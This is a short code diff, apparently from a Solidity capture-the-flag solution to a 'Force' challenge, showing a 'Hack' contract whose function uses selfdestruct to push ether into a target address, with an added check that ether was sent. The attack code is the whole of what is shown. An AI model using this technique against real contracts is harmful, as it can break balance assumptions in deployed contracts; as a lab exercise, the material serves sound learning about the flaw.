@@ -13,8 +13,9 @@ contract Force {/*
 contract Hack  {
 
   // Self destruct destroys the contract and send all the balance to a given a address 
-    function attack(address addr) public payable {
-        selfdestruct(payable(addr));
+    function hack(address addr) public payable {
+      require(msg.value > 0, "Send some eth");
+      selfdestruct(payable(addr));
     }
 
     receive() external payable {
